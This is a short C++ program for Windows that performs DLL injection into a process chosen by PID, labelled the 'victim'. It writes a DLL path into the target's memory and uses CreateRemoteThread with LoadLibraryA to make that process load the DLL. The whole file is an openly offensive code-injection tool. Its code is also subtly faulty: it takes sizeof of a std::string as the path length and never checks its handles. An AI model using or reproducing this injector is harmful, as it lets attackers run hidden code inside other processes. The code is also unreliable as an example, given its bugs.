#include <windows.h>
#include <iostream>
#include <string>

using namespace std;

int main (){

int pidnum ;
string dllpath = "C:\\injected.dll";
cout << "Enter victim PID : ";
cin >> pidnum ;
char dll[sizeof(dllpath)];
	int i;
	for (i = 0; i < sizeof(dllpath); i++) {
		dll[i] = dllpath[i];
	}

// accessing the target process
HANDLE proc = OpenProcess ( PROCESS_ALL_ACCESS, false, (DWORD)pidnum);

// locating memory in the target process for the dll path
LPVOID paddr = VirtualAllocEx( proc, NULL, sizeof(dll), MEM_COMMIT, PAGE_EXECUTE_READ );

// writing the path of the dll into the memory
WriteProcessMemory(proc, paddr ,dll , sizeof(dll), NULL);

// getting the address of LoadLibraryA from memory
PTHREAD_START_ROUTINE pthreadStart = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle("Kernel32.dll"),"LoadLibraryA");

// creating new thread in the target process, startin in the address of LoadLibrary ,passing the dll path as parameter to the function LoadLibraryA
HANDLE pthread = CreateRemoteThread(proc, NULL, 0, pthreadStart, paddr, 0, NULL);

return 0;
}
